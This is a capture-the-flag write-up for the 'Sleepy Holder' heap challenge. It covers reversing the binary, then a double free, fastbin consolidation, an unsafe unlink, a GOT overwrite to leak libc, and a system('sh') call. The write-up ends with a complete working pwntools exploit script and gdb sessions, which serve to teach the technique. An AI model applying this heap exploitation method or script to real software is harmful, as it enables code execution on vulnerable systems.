# Sleepy Holder

This writeup is based off of this really great writeup: https://www.lazenca.net/pages/viewpage.action?pageId=7536654


## Reversing

Main Function:
```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int menu_choice; // eax@2
  unsigned int buf; // [sp+4h] [bp-1Ch]@1
  int fd; // [sp+8h] [bp-18h]@1
  int menu_choice_transfer; // [sp+Ch] [bp-14h]@2
  char menu_input; // [sp+10h] [bp-10h]@2
  __int64 v8; // [sp+18h] [bp-8h]@1

  v8 = *MK_FP(__FS__, 40LL);
  sub_400CEB(a1, a2, a3);
  puts("Waking Sleepy Holder up ...");
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4uLL);
  buf &= 0xFFFu;
  malloc(buf);
  sleep(3u);
  puts("Hey! Do you have any secret?");
  puts("I can help you to hold your secrets, and no one will be able to see it :)");
  while ( 1 )
  {
    puts("1. Keep secret");
    puts("2. Wipe secret");
    puts("3. Renew secret");
    memset(&menu_input, 0, 4uLL);
    read(0, &menu_input, 4uLL);
    menu_choice = atoi(&menu_input);
    menu_choice_transfer = menu_choice;
    switch ( menu_choice )
    {
      case 2:
        wipe_secret();
        break;
      case 3:
        renew_secret();
        break;
      case 1:
        keep_secret();
        break;
    }
  }
}
```
So here we can see the main function. It's pretty much what we would expect, it scans in a string, converts it into an integer, then runs it through a switch statement which will run three sub functions.

keep_secret:
```
__int64 keep_secret()
{
  int secret_choice_int; // eax@3
  char secret_choice; // [sp+10h] [bp-10h]@3
  __int64 stack_canary; // [sp+18h] [bp-8h]@1

  stack_canary = *MK_FP(__FS__, 40LL);
  puts("What secret do you want to keep?");
  puts("1. Small secret");
  puts("2. Big secret");
  if ( !is_huge_secret_allocated )
    puts("3. Keep a huge secret and lock it forever");
  memset(&secret_choice, 0, 4uLL);
  read(0, &secret_choice, 4uLL);
  secret_choice_int = atoi(&secret_choice);
  if ( secret_choice_int == 2 )
  {
    if ( !is_big_secret_allocated )
    {
      big_secret_ptr = calloc(1uLL, 0xFA0uLL);
      is_big_secret_allocated = 1;
      puts("Tell me your secret: ");
      read(0, big_secret_ptr, 0xFA0uLL);
    }
  }
  else if ( secret_choice_int == 3 )
  {
    if ( !is_huge_secret_allocated )
    {
      huge_secret_ptr = calloc(1uLL, 0x61A80uLL);
      is_huge_secret_allocated = 1;
      puts("Tell me your secret: ");
      read(0, huge_secret_ptr, 0x61A80uLL);
    }
  }
  else if ( secret_choice_int == 1 && !is_small_secret_allocated )
  {
    small_secret_ptr = calloc(1uLL, 0x28uLL);
    is_small_secret_allocated = 1;
    puts("Tell me your secret: ");
    read(0, small_secret_ptr, 0x28uLL);
  }
  return *MK_FP(__FS__, 40LL) ^ stack_canary;
}
```

Here we can see that this is where the heap space for the secrets is allocated. There are three different types of secrets, each of a different size (`0x28`, `0xfa0`, and `0x61a80`). We can also see here that it keeps track of if a secret has been allocated with an integer. We can also see that both the integer to keep track, and the ptr to heap space (example: `small_secret_ptr` & `is_small_secret_allocated`) are stored in the global variables bss section. 

wipe_secret:
```
__int64 wipe_secret()
{
  int secret_choice_int; // eax@1
  char secret_choice; // [sp+10h] [bp-10h]@1
  __int64 stack_canary; // [sp+18h] [bp-8h]@1

  stack_canary = *MK_FP(__FS__, 40LL);
  puts("Which Secret do you want to wipe?");
  puts("1. Small secret");
  puts("2. Big secret");
  memset(&secret_choice, 0, 4uLL);
  read(0, &secret_choice, 4uLL);
  secret_choice_int = atoi(&secret_choice);
  if ( secret_choice_int == 1 )
  {
    free(small_secret_ptr);
    is_small_secret_allocated = 0;
  }
  else if ( secret_choice_int == 2 )
  {
    free(big_secret_ptr);
    is_big_secret_allocated = 0;
  }
  return *MK_FP(__FS__, 40LL) ^ stack_canary;
}
```

Here we can see the option to wipe a secret, which is essentially where it frees the allocated heap space. We only have the option to do this with a small or big secret. However it does not check to see if the space it is freeing is allocated. This is a double free bug.

renew_secret:
```
__int64 renew_secret()
{
  int secret_choice_int; // eax@1
  char secret_choice; // [sp+10h] [bp-10h]@1
  __int64 stack_canary; // [sp+18h] [bp-8h]@1

  stack_canary = *MK_FP(__FS__, 40LL);
  puts("Which Secret do you want to renew?");
  puts("1. Small secret");
  puts("2. Big secret");
  memset(&secret_choice, 0, 4uLL);
  read(0, &secret_choice, 4uLL);
  secret_choice_int = atoi(&secret_choice);
  if ( secret_choice_int == 1 )
  {
    if ( is_small_secret_allocated )
    {
      puts("Tell me your secret: ");
      read(0, small_secret_ptr, 0x28uLL);
    }
  }
  else if ( secret_choice_int == 2 && is_big_secret_allocated )
  {
    puts("Tell me your secret: ");
    read(0, big_secret_ptr, 0xFA0uLL);
  }
  return *MK_FP(__FS__, 40LL) ^ stack_canary;
}
```

Here we can see the option to renew a secret. We can only do this to the big, or small secrets. For those it will first check if the corresponding `is_size_secret_allocated` is set not equal to 0, and if it is it will scan in either `0x28` or `0xfa0` (depends on the size) into the corresponding secret location.

## Exploit

So the exploitation process for this binary will have the following steps:
```
*	Clear the previous in use bit with double free
*	Execute the Unsafe Unlink
*	Get an Infoleak
*	Call System
```

#### Double Free to remove prev_in_use bit

So in order to do the unsafe unlink, we need to first remove the previous in use bit from the chunk while we will free to do the unsafe unlink. In order to do this, we can do the double free on the small secret, and do the unsafe unlink on the big secret. To do the double free on the small secret, we will need to do a fastbin consolidation. We can do this by after freeing the small secret, we can allocat a huge secret which will move the chunk for the small secret to the unsorted bin list, and allow us to free the small secret again and pass the check in `malloc()`. Below are some diagrams showing how this will happen/

First we allocate a small and big secret:
```
0:	0x28:	small secret
1:	0xfa0:	big secret
```

So we have two heap chunks there in memory. We can go ahead and free chunk `0`, the small secret:

```
0:	0x28:	small secret (freed)
1:	0xfa0:	big secret
```

Now that we freed chunk `0`, we could go ahead and free it again. However since it is at the top of the free list for fastbins, it would cause a crash. What we can do is allocate a large bin whcih will trigger a `malloc_consolidate()` call. When this happens chunk `0` will get moved from the fastbin free list to the unsorted bin free list. When this happens, we can free chunk `0` again and pass the check in `malloc()`:
```
0:	0x28:		small secret (freed)
1:	0xfa0:		big secret
2:	0x61a80:	huge secret
```

Now that we have allocated a huge bin, we can go ahead and free chunk `0` again, and pass the check in `malloc()` for the chunk being free to not be at the top of the free list:

```
0:	0x28:		small secret (freed twice)
1:	0xfa0:		big secret
2:	0x61a80:	huge secret
```

When the double free happens, it will switch the `previous_in_use` bit in chunk `1` (big secret) to be 0x0. This will set us up to do an unsafe unlink attack in the next step. Below is a gdb walkthrough of this process:

```
gdb-peda$ r
Starting program: /Hackery/Hitcon16/sleepy_holder/SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015 
Waking Sleepy Holder up ...
Hey! Do you have any secret?
I can help you to hold your secrets, and no one will be able to see it :)
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
3. Keep a huge secret and lock it forever
1
Tell me your secret: 
15935728
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
3. Keep a huge secret and lock it forever
2
Tell me your secret: 
75395182
1. Keep secret
2. Wipe secret
3. Renew secret
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffe00 
RBX: 0x0 
RCX: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x4 
RSI: 0x7fffffffdec0 --> 0x7fff00000000 
RDI: 0x0 
RBP: 0x7fffffffded0 --> 0x400e60 (push   r15)
RSP: 0x7fffffffdea8 --> 0x400e14 (lea    rax,[rbp-0x10])
RIP: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0xfb0 
R10: 0x7ffff7dd1b58 --> 0x604960 --> 0x0 
R11: 0x246 
R12: 0x400850 (xor    ebp,ebp)
R13: 0x7fffffffdfb0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7b08887 <read+7>:	jne    0x7ffff7b08899 <read+25>
   0x7ffff7b08889 <__read_nocancel>:	mov    eax,0x0
   0x7ffff7b0888e <__read_nocancel+5>:	syscall 
=> 0x7ffff7b08890 <__read_nocancel+7>:	cmp    rax,0xfffffffffffff001
   0x7ffff7b08896 <__read_nocancel+13>:	jae    0x7ffff7b088c9 <read+73>
   0x7ffff7b08898 <__read_nocancel+15>:	ret    
   0x7ffff7b08899 <read+25>:	sub    rsp,0x8
   0x7ffff7b0889d <read+29>:	call   0x7ffff7b26d70 <__libc_enable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdea8 --> 0x400e14 (lea    rax,[rbp-0x10])
0008| 0x7fffffffdeb0 --> 0x97300400e60 
0016| 0x7fffffffdeb8 --> 0x100000003 
0024| 0x7fffffffdec0 --> 0x7fff00000000 
0032| 0x7fffffffdec8 --> 0x81a8d4c7753aa200 
0040| 0x7fffffffded0 --> 0x400e60 (push   r15)
0048| 0x7fffffffded8 --> 0x7ffff7a303f1 (<__libc_start_main+241>:	mov    edi,eax)
0056| 0x7fffffffdee0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0x00007ffff7b08890 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
gdb-peda$ find 15935728
Searching for '15935728' in: None ranges
Found 1 results, display max 1 items:
[heap] : 0x603990 ("15935728\n")
gdb-peda$ find 75395182
Searching for '75395182' in: None ranges
Found 1 results, display max 1 items:
[heap] : 0x6039c0 ("75395182\n")
gdb-peda$ x/x 0x603990
0x603990:	0x31
gdb-peda$ x/g 0x603990
0x603990:	0x3832373533393531
gdb-peda$ x/4g 0x603980
0x603980:	0x0000000000000000	0x0000000000000031
0x603990:	0x3832373533393531	0x000000000000000a
gdb-peda$ x/16g 0x603980
0x603980:	0x0000000000000000	0x0000000000000031
0x603990:	0x3832373533393531	0x000000000000000a
0x6039a0:	0x0000000000000000	0x0000000000000000
0x6039b0:	0x0000000000000000	0x0000000000000fb1
0x6039c0:	0x3238313539333537	0x000000000000000a
0x6039d0:	0x0000000000000000	0x0000000000000000
0x6039e0:	0x0000000000000000	0x0000000000000000
0x6039f0:	0x0000000000000000	0x0000000000000000
``` 

So we can see the two secrets we have allocated, the small secret which contains `15935728` and starts at `0x603980` followed by the big secret which contains `75395182` and starts at `0x6039b0`. Let's free the small secret and look at the fastbin list:

```
gdb-peda$ c
Continuing.
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
1
1. Keep secret
2. Wipe secret
3. Renew secret
^C
Program received signal SIGINT, Interrupt.






[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffe00 
RBX: 0x0 
RCX: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x4 
RSI: 0x7fffffffdec0 --> 0x7fff00000000 
RDI: 0x0 
RBP: 0x7fffffffded0 --> 0x400e60 (push   r15)
RSP: 0x7fffffffdea8 --> 0x400e14 (lea    rax,[rbp-0x10])
RIP: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x0 
R10: 0x8ba 
R11: 0x246 
R12: 0x400850 (xor    ebp,ebp)
R13: 0x7fffffffdfb0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7b08887 <read+7>:	jne    0x7ffff7b08899 <read+25>
   0x7ffff7b08889 <__read_nocancel>:	mov    eax,0x0
   0x7ffff7b0888e <__read_nocancel+5>:	syscall 
=> 0x7ffff7b08890 <__read_nocancel+7>:	cmp    rax,0xfffffffffffff001
   0x7ffff7b08896 <__read_nocancel+13>:	jae    0x7ffff7b088c9 <read+73>
   0x7ffff7b08898 <__read_nocancel+15>:	ret    
   0x7ffff7b08899 <read+25>:	sub    rsp,0x8
   0x7ffff7b0889d <read+29>:	call   0x7ffff7b26d70 <__libc_enable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdea8 --> 0x400e14 (lea    rax,[rbp-0x10])
0008| 0x7fffffffdeb0 --> 0x97300400e60 
0016| 0x7fffffffdeb8 --> 0x200000003 
0024| 0x7fffffffdec0 --> 0x7fff00000000 
0032| 0x7fffffffdec8 --> 0x81a8d4c7753aa200 
0040| 0x7fffffffded0 --> 0x400e60 (push   r15)
0048| 0x7fffffffded8 --> 0x7ffff7a303f1 (<__libc_start_main+241>:	mov    edi,eax)
0056| 0x7fffffffdee0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0x00007ffff7b08890 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
gdb-peda$ p main_arena.fastbinsY
$10 = {0x0, 0x603980, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
```

So we can see here the small secret chunk `0x603980` is in the fastbin list. Now we should be able to allocate a huge secret, which should move it from the fastbin list:

```
gdb-peda$ c
Continuing.
1
What secret do you want to keep?
1. Small secret
2. Big secret
3. Keep a huge secret and lock it forever
3
Tell me your secret: 
789654123
1. Keep secret
2. Wipe secret
3. Renew secret
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffe00 
RBX: 0x0 
RCX: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x4 
RSI: 0x7fffffffdec0 --> 0x7fff00000000 
RDI: 0x0 
RBP: 0x7fffffffded0 --> 0x400e60 (push   r15)
RSP: 0x7fffffffdea8 --> 0x400e14 (lea    rax,[rbp-0x10])
RIP: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x0 
R10: 0x22 ('"')
R11: 0x246 
R12: 0x400850 (xor    ebp,ebp)
R13: 0x7fffffffdfb0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7b08887 <read+7>:	jne    0x7ffff7b08899 <read+25>
   0x7ffff7b08889 <__read_nocancel>:	mov    eax,0x0
   0x7ffff7b0888e <__read_nocancel+5>:	syscall 
=> 0x7ffff7b08890 <__read_nocancel+7>:	cmp    rax,0xfffffffffffff001
   0x7ffff7b08896 <__read_nocancel+13>:	jae    0x7ffff7b088c9 <read+73>
   0x7ffff7b08898 <__read_nocancel+15>:	ret    
   0x7ffff7b08899 <read+25>:	sub    rsp,0x8
   0x7ffff7b0889d <read+29>:	call   0x7ffff7b26d70 <__libc_enable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdea8 --> 0x400e14 (lea    rax,[rbp-0x10])
0008| 0x7fffffffdeb0 --> 0x97300400e60 
0016| 0x7fffffffdeb8 --> 0x100000003 
0024| 0x7fffffffdec0 --> 0x7fff00000000 
0032| 0x7fffffffdec8 --> 0x81a8d4c7753aa200 
0040| 0x7fffffffded0 --> 0x400e60 (push   r15)
0048| 0x7fffffffded8 --> 0x7ffff7a303f1 (<__libc_start_main+241>:	mov    edi,eax)
0056| 0x7fffffffdee0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0x00007ffff7b08890 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
gdb-peda$ p main_arena.fastbinsY
$11 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
```

So we can see here, that the small secret chunk has been removed from the fastbin list. This means that we can execute the double free now, without failing the check in `malloc()` and causing the code to crash:
```
gdb-peda$ c
Continuing.
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
1
1. Keep secret
2. Wipe secret
3. Renew secret
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffe00 
RBX: 0x0 
RCX: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x4 
RSI: 0x7fffffffdec0 --> 0x7fff00000000 
RDI: 0x0 
RBP: 0x7fffffffded0 --> 0x400e60 (push   r15)
RSP: 0x7fffffffdea8 --> 0x400e14 (lea    rax,[rbp-0x10])
RIP: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x0 
R10: 0x7ffff7b84f60 --> 0x100000000 
R11: 0x246 
R12: 0x400850 (xor    ebp,ebp)
R13: 0x7fffffffdfb0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7b08887 <read+7>:	jne    0x7ffff7b08899 <read+25>
   0x7ffff7b08889 <__read_nocancel>:	mov    eax,0x0
   0x7ffff7b0888e <__read_nocancel+5>:	syscall 
=> 0x7ffff7b08890 <__read_nocancel+7>:	cmp    rax,0xfffffffffffff001
   0x7ffff7b08896 <__read_nocancel+13>:	jae    0x7ffff7b088c9 <read+73>
   0x7ffff7b08898 <__read_nocancel+15>:	ret    
   0x7ffff7b08899 <read+25>:	sub    rsp,0x8
   0x7ffff7b0889d <read+29>:	call   0x7ffff7b26d70 <__libc_enable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdea8 --> 0x400e14 (lea    rax,[rbp-0x10])
0008| 0x7fffffffdeb0 --> 0x97300400e60 
0016| 0x7fffffffdeb8 --> 0x200000003 
0024| 0x7fffffffdec0 --> 0x7fff00000000 
0032| 0x7fffffffdec8 --> 0x81a8d4c7753aa200 
0040| 0x7fffffffded0 --> 0x400e60 (push   r15)
0048| 0x7fffffffded8 --> 0x7ffff7a303f1 (<__libc_start_main+241>:	mov    edi,eax)
0056| 0x7fffffffdee0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0x00007ffff7b08890 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	in ../sysdeps/unix/syscall-template.S
gdb-peda$ p main_arena.fastbinsY
$17 = {0x0, 0x603980, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ x/16g 0x603980
0x603980:	0x0000000000000000	0x0000000000000031
0x603990:	0x0000000000000000	0x00007ffff7dd1b78
0x6039a0:	0x0000000000000000	0x0000000000000000
0x6039b0:	0x0000000000000030	0x0000000000000fb0
0x6039c0:	0x3238313539333537	0x000000000000000a
0x6039d0:	0x0000000000000000	0x0000000000000000
0x6039e0:	0x0000000000000000	0x0000000000000000
0x6039f0:	0x0000000000000000	0x0000000000000000
gdb-peda$ p main_arena.bins[4]
$22 = (mchunkptr) 0x603980
gdb-peda$ p main_arena.bins[5]
$23 = (mchunkptr) 0x603980
```

There we can see that we have succesfully executed the double free, and switched the previous in use bit to `0x0` for chunk `1` which starts at `0x6039b0` (the previous in use bit is the least signficant bit of the second QWORD for the chunk metadata, so we can see that it is changed since `0xfb0` switched to `0xfb1`). Lastly we can see the two bins each with the address of the chunk that we did the double free on.

#### Unsafe Unlink

For the unsafe unlink, the idea is to write over the global variable which contains the small secret pointer `small_secret_ptr`. We can do this by creating a fake chunk in the small secret chunk, then using the setup from the previous step, we can free the chunk for the big secret. We will also need to overflow the `previous_size` value of the big secret to be `0x20`. This is because  we need to shrink the previous size of the big secret chunk, so it thinks that the previous chunk begins where we placed the fake chunk, so the unlink can happen. Then when we free the big secret (since the previous in use bit is set to zero, and the previous size has been shrinked), it will try to unlink our fake chunk, since it will think it is a freed chunk. Durring that process it will write to the `small_secret_ptr` global variable located at `0x6020d0` (since it is a global variable, it will have a static address so we don't need an infoleak to know where to write to).

Here is what the fake chunk will contain:

```
0x0:	0
0x8:	0
0x10:	0x6020d0 - 0x18 = 0x6020b8
0x18:	0x6020d0 - 0x10 = 0x6020c0
0x20:	0x20
```

So our fake chunk starts with 16 bytes of `0x0`, follows up with the two eight byte integers `0x6020b8` and `0x6020c0`, then finishes off with `0x20`. The reason for the eight bytes of `0x0`, is that in the chunk structure, those two qwords hold the `prev_size` and `size` values which we need to be `0` in order for this attack to work. The reason for the two hex values `0x6020b8` and `0x6020c0` is to act as the `fd` and `bk` (next fee chunk and previous free chunk) values. The address that we are trying to overwrite is at `0x6020d0`. The check for `fd` and `bk` that we need to pass is `(P->fd->bk != P || P->bk->fd != P) == false`. For this to work, we will need to have `fd` be `0x6020d0 - 0x18`, since with that check it will be looking for the value 3 qwords forward. In addition to that, we will need `bk` to be equal to `0x6020d0 - 0x10` since with that check it will be looking for the value 2 qwords forward. Lastly the `0x20` is a value we will be overflowing into the previous size value for the big secret chunk, so it thinks that the previous chunk starts where our fake chunk is.

Let's take a look at the memory in gdb to see how the overflow works (picking up where the previous section left off, but with a different instance of the program):
```
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
1
Tell me your secret: 
15935728
1. Keep secret
2. Wipe secret
3. Renew secret
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffe00 
RBX: 0x0 
RCX: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x4 
RSI: 0x7fffffffdea0 --> 0x7fff00000000 
RDI: 0x0 
RBP: 0x7fffffffdeb0 --> 0x400e60 (push   r15)
RSP: 0x7fffffffde88 --> 0x400e14 (lea    rax,[rbp-0x10])
RIP: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x30 ('0')
R10: 0x7ffff7b84f60 --> 0x100000000 
R11: 0x246 
R12: 0x400850 (xor    ebp,ebp)
R13: 0x7fffffffdf90 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7b08887 <read+7>:	jne    0x7ffff7b08899 <read+25>
   0x7ffff7b08889 <__read_nocancel>:	mov    eax,0x0
   0x7ffff7b0888e <__read_nocancel+5>:	syscall 
=> 0x7ffff7b08890 <__read_nocancel+7>:	cmp    rax,0xfffffffffffff001
   0x7ffff7b08896 <__read_nocancel+13>:	jae    0x7ffff7b088c9 <read+73>
   0x7ffff7b08898 <__read_nocancel+15>:	ret    
   0x7ffff7b08899 <read+25>:	sub    rsp,0x8
   0x7ffff7b0889d <read+29>:	call   0x7ffff7b26d70 <__libc_enable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde88 --> 0x400e14 (lea    rax,[rbp-0x10])
0008| 0x7fffffffde90 --> 0xe9200400e60 
0016| 0x7fffffffde98 --> 0x100000003 
0024| 0x7fffffffdea0 --> 0x7fff00000000 
0032| 0x7fffffffdea8 --> 0xe3d4dfe339bdb500 
0040| 0x7fffffffdeb0 --> 0x400e60 (push   r15)
0048| 0x7fffffffdeb8 --> 0x7ffff7a303f1 (<__libc_start_main+241>:	mov    edi,eax)
0056| 0x7fffffffdec0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0x00007ffff7b08890 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
gdb-peda$ find 15935728
Searching for '15935728' in: None ranges
Found 1 results, display max 1 items:
[heap] : 0x603eb0 ("15935728\n")
gdb-peda$ x/x 0x603eb0
0x603eb0:	0x31
gdb-peda$ x/g 0x603eb0
0x603eb0:	0x3832373533393531
gdb-peda$ x/16g 0x603eb0
0x603eb0:	0x3832373533393531	0x000000000000000a
0x603ec0:	0x0000000000000000	0x0000000000000000
0x603ed0:	0x0000000000000000	0x0000000000000fb0
0x603ee0:	0x3231343536393837	0x0000000000000a33
0x603ef0:	0x0000000000000000	0x0000000000000000
0x603f00:	0x0000000000000000	0x0000000000000000
0x603f10:	0x0000000000000000	0x0000000000000000
0x603f20:	0x0000000000000000	0x0000000000000000
```

So we can see that our input for the small secret starts at `0x603eb0`. We can write `0x28` bytes to it,  which will allow us to overflow the `previous_size` value for the big secret, but not the `previous_in_use` bit (however the double free already took care of that).

After we execute the unsafe unlink by freeing the big secret, it will write the value `0x6020b8` to `0x6020d0`. This is extremely useful, since we can write to that pointer, and after `0x18` bytes of input we can overwrite the pointer stored in `0x6020d0`

#### Infoleak

Now that we can write over the value for `0x6020d0`, we can go ahead and get an infoleak. We will be doing this by overwriting the got address of `free` with that of the plt address of `puts` (since it is an imported function), then calling `free` (which will really call `puts`) with `puts` as an argument to leak the libc address for `puts`. With that we will get a libc infoleak, and be able to figure out the address for `system`.

This process will contain three parts:
```
*	Write over the value in 0x6020d0 with the got address of free, with the got address of puts eight bytes behind it
*	Overwrite the got address of free with the plt address of puts
*	Call free to get the infoleak
```

For writing over the value in `0x6020d0`, we can just opt to renew the secret for the small secret. The data we put in there will start off with 8 bytes of `0x0`, followed by the got address of `puts` (since that is where `puts` will expect it's input), followed by another 8 bytes of `0x0`, then finally the got address of `free`.

Proceeding that since small secret (0x6020d0) will now point to free, we can just opt to renew the secret again, and we will be able to write directly to got address of `free`, and overwrite it with anything we want (in this case the plt address of `puts`). 

Proceeding that we can just call free by wiping the big secret, and we will get our libc infoleak for puts, which will allow us to know the address of everything in libc.

#### Call System

Time for the last step. Now that we can calculate the address of system using the infoleak, and we can write over the got addrss of `free`, we can just write over the got address of `free` with the got address of `system`. Proceeding that we can just reallocate a big secret, and write to it the value `sh`. Then we can wipe the big secret, which will call `system`, which takes a char pointer as an argument (in this case that pointer will be pointing to `sh`). With that we will get a shell


## Exploit

Putting it all together, we get the following exploit:

```
# This exploit is based off of: https://www.lazenca.net/pages/viewpage.action?pageId=7536654
from pwn import *

target = process('./SleepyHolder')
elf = ELF('SleepyHolder')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(target)

def KeepSecret(type, data):
	target.recvuntil("3. Renew secret")
	target.sendline("1")
	target.recvuntil("What secret do you want to keep?")
	target.sendline(str(type))
	target.recvuntil("Tell me your secret: ")
	target.send(data)

def WipeSecret(type):
	target.recvuntil("3. Renew secret")
	target.sendline("2")
	target.recvuntil("Which Secret do you want to wipe?")
	target.sendline(str(type))

def RenewSecret(type, data):
	target.recvuntil("3. Renew secret")
	target.sendline("3")
	target.recvuntil("Which Secret do you want to renew?")
	target.sendline(str(type))
	target.recvuntil("Tell me your secret: ")
	target.send(data)

small_secret = 0x6020d0

# Execute the double free
KeepSecret(1, "15935728")
KeepSecret(2, "95175382")
WipeSecret(1)
KeepSecret(3, "35715928")
WipeSecret(1)

# Construct the fake chunk, and allocate a new small secret which we will store it
fake_chunk = p64(0)*2
fake_chunk += p64(small_secret - 0x18)
fake_chunk += p64(small_secret - 0x10)
fake_chunk += p64(0x20)
KeepSecret(1, fake_chunk)

# Free the big Secret, which will execute the unsafe unlink
WipeSecret(2)

# Construct the payload to write over 0x6020d0 with the got address of free, with the got address of puts eight bytes behind it
got_overwrite = p64(0)
got_overwrite += p64(elf.got['puts'])
got_overwrite += p64(0)
got_overwrite += p64(elf.got['free'])

# Execute the overwrite
RenewSecret(1, got_overwrite)


# Execute the write over the got address of free with the plt address of puts
RenewSecret(1, p64(elf.plt['puts']))

# Call free to get the infoleak for the got address of puts
WipeSecret(2)

# Filter out the info leak, and calculate libc base and address of system
target.recvuntil('\n1. Small secret\n2. Big secret\n')
leak = target.recv(6)
puts = u64(leak + "\x00\x00")
libc_base = puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
log.info("Address of puts:      " + hex(puts)) 
log.info("Address of system:    " + hex(system)) 
log.info("Address of libc base: " + hex(libc_base)) 


# Now that we know where system is, we can write over the got address of free with the got address of system
RenewSecret(1, p64(system))

# Prepare a char pointer to 'sh' by creating a new big secret with the string 'sh'
KeepSecret(2, 'sh')

# Execute the shell
WipeSecret(2)

target.interactive()

# This exploit is based off of: https://www.lazenca.net/pages/viewpage.action?pageId=7536654
```

When we run it:
```
$	python exploit.py 
[+] Starting local process './SleepyHolder': pid 14832
[*] '/Hackery/Hitcon16/sleepy_holder/SleepyHolder'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Address of puts:      0x7fb2eae3a920
[*] Address of system:    0x7fb2eae0f6a0
[*] Address of libc base: 0x7fb2eadca000
[*] Switching to interactive mode

1. Small secret
2. Big secret
$ ls
core
exploit.py
libc.so.6
libc.so.6_375198810bb39e6593a968fcbcf6556789026743
notes
peda-session-dash.txt
peda-session-SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015.txt
peda-session-SleepyHolder.txt
peda-session-sl.txt
peda-session-w.procps.txt
readme.md
sl
SleepyHolder
solved.py
$ w
 15:25:52 up  2:41,  1 user,  load average: 2.72, 1.88, 1.60
